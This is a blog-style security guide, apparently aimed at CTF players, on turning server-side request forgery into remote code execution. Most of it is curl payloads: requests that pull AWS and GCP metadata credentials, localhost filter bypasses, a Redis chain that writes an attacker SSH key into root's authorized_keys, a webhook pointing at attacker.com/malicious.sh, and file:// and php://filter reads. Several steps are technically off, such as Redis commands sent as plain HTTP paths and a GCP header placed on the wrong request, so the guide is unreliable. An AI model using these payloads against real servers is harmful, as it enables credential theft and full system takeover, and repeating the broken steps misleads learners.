---
title: "SSRF to RCE: Exploiting Server-Side Request Forgery for Remote Code Execution"
date: "2025-02-03"
author: "Sumon Nath"
tags: [CTF, cybersecurity, SSRF, RCE, exploitation, recon]
---

# SSRF to RCE: Exploiting Server-Side Request Forgery for Remote Code Execution

Server-Side Request Forgery (SSRF) is a powerful attack vector that allows an attacker to manipulate a server into making unintended requests. When leveraged correctly, SSRF can escalate into Remote Code Execution (RCE), allowing full system compromise. This guide explores different techniques to pivot from SSRF to RCE in CTF challenges and real-world scenarios.

---

## **1. Understanding SSRF to RCE**

### **What is SSRF?**
SSRF occurs when a web application fetches resources from user-controlled input without proper validation. This can be used to:
- Access internal services (e.g., 127.0.0.1, metadata APIs, etc.).
- Exploit vulnerable endpoints.
- Execute system commands by chaining with other vulnerabilities.

### **Common SSRF Targets**
- Cloud Metadata APIs (AWS, GCP, Azure, DigitalOcean, etc.).
- Internal Admin Panels (`http://localhost:8080/admin`).
- Internal Services (e.g., Redis, MongoDB, Memcached).
- Webhooks & API Calls.

---

## **2. Identifying SSRF**

### **Basic SSRF Detection**
Use Burp Suite or cURL to test external requests:
```bash
curl -X GET "http://vulnerable-site.com/?url=http://your-server.com/log"
```
If your server logs a request from the target, SSRF is possible.

### **Testing for Internal Resources**
```bash
curl -X GET "http://vulnerable-site.com/?url=http://127.0.0.1:8080"
```
If internal resources return a valid response, the SSRF allows internal scanning.

### **Bypassing URL Filtering**
Some applications block specific substrings like `http://localhost`. Use encoding and variations:
```bash
http://127.1/
http://[::1]/
http://0.0.0.0/
http://2130706433/
```

---

## **3. SSRF to RCE Exploitation Methods**

### **1. Exploiting Cloud Metadata APIs**
If an application is hosted on AWS, GCP, or Azure, SSRF can be used to fetch credentials.

#### **AWS Metadata Service**
```bash
curl -X GET "http://vulnerable-site.com/?url=http://169.254.169.254/latest/meta-data/"
```
Retrieve AWS credentials:
```bash
curl -X GET "http://vulnerable-site.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```
Use credentials to access AWS services.

#### **GCP Metadata Service**
```bash
curl -X GET "http://vulnerable-site.com/?url=http://169.254.169.254/computeMetadata/v1/"
```
Use headers for GCP metadata:
```bash
curl -H "Metadata-Flavor: Google" -X GET "http://vulnerable-site.com/?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

### **2. Pivoting to Internal Services**

#### **Redis SSRF to RCE**
If Redis is exposed, write a malicious SSH key:
```bash
curl -X GET "http://vulnerable-site.com/?url=http://127.0.0.1:6379/flushall"
curl -X GET "http://vulnerable-site.com/?url=http://127.0.0.1:6379/set ssh_key 'ssh-rsa AAAAB3... user@attacker'"
curl -X GET "http://vulnerable-site.com/?url=http://127.0.0.1:6379/config set dir /root/.ssh"
curl -X GET "http://vulnerable-site.com/?url=http://127.0.0.1:6379/config set dbfilename authorized_keys"
curl -X GET "http://vulnerable-site.com/?url=http://127.0.0.1:6379/save"
```
Login via SSH:
```bash
ssh -i id_rsa user@target-ip
```

#### **Exploiting Webhooks for RCE**
If an SSRF vulnerability allows webhooks to trigger external requests, it can be used for code execution.
```bash
curl -X POST "http://vulnerable-site.com/webhook" -d '{"url":"http://attacker.com/malicious.sh"}'
```

### **3. File Inclusion to RCE**
If the SSRF request is reflected inside the application, it may lead to local file inclusion (LFI):
```bash
curl -X GET "http://vulnerable-site.com/?url=file:///etc/passwd"
```
If PHP wrappers are enabled, SSRF can lead to Remote Code Execution:
```bash
curl -X GET "http://vulnerable-site.com/?url=php://filter/convert.base64-encode/resource=index.php"
```

---

## **4. Automating SSRF Attacks**

### **Using SSRFmap**
```bash
git clone https://github.com/swisskyrepo/SSRFmap.git
cd SSRFmap
python3 ssrfmap.py -u "http://vulnerable-site.com/?url=FUZZ" -p metadata
```

### **Using Burp Collaborator**
Intercept the request and replace the URL with a Burp Collaborator payload. If the server pings Burp Collaborator, it confirms SSRF.

---

## **5. Preventing SSRF Attacks**

### **Restrict Internal Requests**
- Block direct access to internal IP ranges (127.0.0.1, 169.254.169.254).
- Implement allowlists for external requests.

### **Use Secure Webhooks and API Calls**
- Require authentication and signature verification for webhook requests.
- Limit webhooks to specific trusted domains.

### **Sanitize User Input**
- Validate and enforce URL schemes (`http://` and `https://` only).
- Deny redirects and prevent open redirects.

---

## **Conclusion**

SSRF is a powerful vulnerability that can lead to Remote Code Execution when combined with misconfigured cloud services, internal APIs, or insecure file handling. By understanding various exploitation techniques, attackers can escalate SSRF vulnerabilities into full system compromise.

🚀 Keep testing, keep learning, and stay secure!

---

💡 **Want more security insights?** Stay tuned for advanced SSRF exploitation techniques!

